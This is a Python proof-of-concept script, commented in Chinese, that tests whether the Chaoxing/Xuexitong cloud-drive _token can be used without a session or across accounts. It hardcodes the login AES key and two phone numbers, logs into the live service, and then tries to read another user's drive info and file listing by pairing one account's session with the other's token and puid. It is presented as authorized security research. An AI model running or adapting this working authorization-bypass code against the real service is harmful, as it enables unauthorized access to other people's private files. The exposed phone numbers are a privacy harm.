#!/usr/bin/env python3
"""
_token 绕过方案验证脚本

验证学习通云盘 _token 的以下安全特性:
  1. _token 稳定性: 同一用户多次获取的 _token 是否相同
  2. _token 长期有效性: Session 过期后 _token 是否仍然有效
  3. _token 与 Session 绑定: 跨账号 Session+Token 组合是否可越权

登录加密: AES-CBC, 密钥 u2oh6Vu^HWe4_AES, IV=密钥前16字节, PKCS7填充
登录接口: POST https://passport2.chaoxing.com/fanyalogin

仅用于安全研究和授权测试目的。
"""

import time
import json
import sys

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

AES_KEY = b'u2oh6Vu^HWe4_AES'
AES_IV = AES_KEY[:16]

ACCOUNTS = [
    {"phone": "19312994130", "password": "", "puid": 252798154, "label": "账号1"},
    {"phone": "15034188203", "password": "", "puid": 239448447, "label": "账号2"},
]

PAN_BASE = "https://pan-yz.chaoxing.com"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
TOKEN_URL = f"{PAN_BASE}/api/token/uservalid"
INFO_URL = f"{PAN_BASE}/api/info"
DISK_URL = f"{PAN_BASE}/api/getUserDiskCapacity"
DIR_URL = f"{PAN_BASE}/api/getMyDirAndFiles"


def aes_encrypt(plaintext: str) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    ct = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))
    return base64.b64encode(ct).decode('utf-8')


def login(phone: str, password: str) -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    })
    data = {
        "fid": "-1",
        "uname": aes_encrypt(phone),
        "password": aes_encrypt(password),
        "refer": "http%3A%2F%2Fi.mooc.chaoxing.com",
        "t": "true",
        "forbidotherlogin": "0",
        "validate": "",
        "doubleFactorLogin": "0",
        "independentId": "0",
        "independentNameId": "0",
    }
    resp = session.post(LOGIN_URL, data=data)
    result = resp.json()
    if result.get("status"):
        print(f"  [登录成功] {phone}")
        return session
    else:
        print(f"  [登录失败] {phone}: {result}")
        return None


def get_token(session: requests.Session) -> str:
    resp = session.get(TOKEN_URL)
    data = resp.json()
    token = data.get("_token", data.get("token", ""))
    return token


def get_puid_from_session(session: requests.Session) -> int:
    for cookie in session.cookies:
        if cookie.name == "UID":
            return int(cookie.value)
    return 0


def section(title: str):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")


def test_token_stability(sessions: dict):
    section("测试1: _token 稳定性测试")
    print("  目标: 同一用户多次调用 /api/token/uservalid，检查 _token 是否相同\n")

    STABILITY_ROUNDS = 5

    for label, sess in sessions.items():
        puid = get_puid_from_session(sess)
        tokens = []
        print(f"  [{label}] puid={puid}, 连续获取 {STABILITY_ROUNDS} 次 _token:")
        for i in range(STABILITY_ROUNDS):
            token = get_token(sess)
            tokens.append(token)
            print(f"    第{i+1}次: {token}")
            time.sleep(0.5)

        all_same = all(t == tokens[0] for t in tokens)
        if all_same:
            print(f"  [{label}] 结果: _token 稳定 (所有次获取结果一致)")
        else:
            print(f"  [{label}] 结果: _token 不稳定! 多次获取结果不同")
            print(f"    唯一值数量: {len(set(tokens))}/{STABILITY_ROUNDS}")
        print()


def test_token_long_term_validity(sessions: dict):
    section("测试2: _token 长期有效性测试")
    print("  目标: 获取 _token 后，使用新 Session（不登录）直接带 _token 访问 API\n")

    for label, sess in sessions.items():
        puid = get_puid_from_session(sess)
        token = get_token(sess)
        print(f"  [{label}] puid={puid}, _token={token}")

        anon_session = requests.Session()
        anon_session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 "
                           "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        })

        print(f"  [{label}] 使用匿名 Session (无Cookie) + _token + puid 访问 /api/info:")
        resp = anon_session.get(INFO_URL, params={"puid": puid, "_token": token})
        try:
            data = resp.json()
            if data.get("result") is False or data.get("result") == False:
                print(f"    被拒绝: {data}")
            else:
                print(f"    访问成功! (匿名Session+Token有效)")
                print(f"    响应码: {data.get('code')}, 含root: {'root' in str(data)}")
        except Exception as e:
            print(f"    响应解析失败: {e}, 原始: {resp.text[:200]}")

        print(f"  [{label}] 使用新登录 Session + 旧 _token 访问:")
        time.sleep(1)

        print()


def test_token_session_binding(sessions: dict):
    section("测试3: _token 与 Session 绑定测试")
    print("  目标: 使用账号1的 Session + 账号2的 _token + 账号2的 puid，验证越权访问\n")

    sess1 = sessions.get("账号1")
    sess2 = sessions.get("账号2")

    if not sess1 or not sess2:
        print("  缺少必要的登录 Session，跳过此测试")
        return

    puid1 = get_puid_from_session(sess1)
    puid2 = get_puid_from_session(sess2)
    token1 = get_token(sess1)
    token2 = get_token(sess2)

    print(f"  账号1: puid={puid1}, _token={token1}")
    print(f"  账号2: puid={puid2}, _token={token2}")
    print()

    test_cases = [
        {
            "name": "基线-账号1正常访问",
            "session": sess1,
            "puid": puid1,
            "token": token1,
            "expect": "success",
        },
        {
            "name": "基线-账号2正常访问",
            "session": sess2,
            "puid": puid2,
            "token": token2,
            "expect": "success",
        },
        {
            "name": "场景A-同Token跨puid (Session1+Token1+puid2)",
            "session": sess1,
            "puid": puid2,
            "token": token1,
            "expect": "reject",
        },
        {
            "name": "场景B-跨Token跨puid (Session1+Token2+puid2)",
            "session": sess1,
            "puid": puid2,
            "token": token2,
            "expect": "critical_if_success",
        },
    ]

    api_endpoints = [
        {"name": "/api/info", "url": INFO_URL, "method": "GET", "extra_params": {}},
        {"name": "/api/getUserDiskCapacity", "url": DISK_URL, "method": "GET", "extra_params": {}},
        {"name": "/api/getMyDirAndFiles", "url": DIR_URL, "method": "GET", "extra_params": {"fldid": "0"}},
    ]

    for case in test_cases:
        print(f"  --- {case['name']} ---")
        for ep in api_endpoints:
            params = {"puid": case["puid"], "_token": case["token"]}
            params.update(ep.get("extra_params", {}))

            try:
                if ep["method"] == "GET":
                    resp = case["session"].get(ep["url"], params=params)
                else:
                    resp = case["session"].post(ep["url"], data=params)

                data = resp.json()
                is_success = data.get("result") is True or data.get("code") == 2

                if is_success:
                    status = "✅ 成功"
                    if case["expect"] == "reject":
                        status = "🔴 意外成功 (应被拒绝!)"
                    elif case["expect"] == "critical_if_success":
                        status = "🔴🔴🔴 越权成功! CRITICAL!"
                else:
                    status = "🚫 被拒绝"
                    if case["expect"] == "success":
                        status = "⚠️ 意外被拒绝"

                msg = data.get("msg", "")
                brief = f"code={data.get('code')}, msg={msg}" if msg else f"code={data.get('code')}"
                print(f"    {ep['name']}: {status} | {brief}")

            except Exception as e:
                print(f"    {ep['name']}: ❌ 请求异常: {e}")

        print()

    print("  授权模型分析:")
    print("    如果场景A被拒绝但场景B成功:")
    print("      → 服务端仅校验 _token 与 puid 的匹配关系")
    print("      → 完全忽略 Cookie/Session 中的用户身份")
    print("      → _token 未与 Session 绑定，存在越权风险")


def main():
    print("=" * 70)
    print("  学习通云盘 _token 绕过方案验证")
    print("  仅用于安全研究和授权测试目的")
    print("=" * 70)

    print("\n[提示] 请输入测试账号密码 (直接回车跳过，使用空密码)")
    for acc in ACCOUNTS:
        if not acc["password"]:
            try:
                pw = input(f"  请输入 {acc['label']} ({acc['phone']}) 的密码: ").strip()
                acc["password"] = pw
            except EOFError:
                acc["password"] = ""

    section("登录测试账号")
    sessions = {}
    for acc in ACCOUNTS:
        if acc["password"]:
            sess = login(acc["phone"], acc["password"])
            if sess:
                sessions[acc["label"]] = sess
                puid = get_puid_from_session(sess)
                print(f"  {acc['label']} Cookie中的UID: {puid}")
            else:
                print(f"  {acc['label']} 登录失败，跳过")
        else:
            print(f"  {acc['label']} 未提供密码，跳过登录")

    if len(sessions) < 2:
        print("\n  ⚠️  需要至少2个成功登录的账号才能完成所有测试")
        print("  将仅执行可用的测试项\n")

    if sessions:
        test_token_stability(sessions)

    if sessions:
        test_token_long_term_validity(sessions)

    if len(sessions) >= 2:
        test_token_session_binding(sessions)
    else:
        section("测试3: _token 与 Session 绑定测试")
        print("  ⚠️  需要2个成功登录的账号，当前不足，跳过此测试")

    section("测试总结")
    print("""
  测试项及安全含义:
  ┌─────────────────────┬──────────────────────────────────────────────┐
  │ 测试项              │ 安全含义                                     │
  ├─────────────────────┼──────────────────────────────────────────────┤
  │ _token 稳定性       │ 若稳定，Token 一旦泄露可长期使用             │
  │ _token 长期有效性   │ 若 Session 无关，Token 可脱离 Session 使用   │
  │ _token Session绑定  │ 若未绑定，可用他人 Session + Token 越权      │
  └─────────────────────┴──────────────────────────────────────────────┘

  综合风险:
    若三项测试均显示 _token 不与 Session 绑定且长期稳定有效，
    则 _token 一旦泄露（URL Referer/日志/嗅探），攻击者可:
    1. 无需目标用户 Session 即可访问其云盘
    2. 使用自身 Session + 目标 Token + 目标 puid 越权访问
    3. Token 不会因 Session 过期而失效，攻击窗口极大
""")


if __name__ == "__main__":
    main()
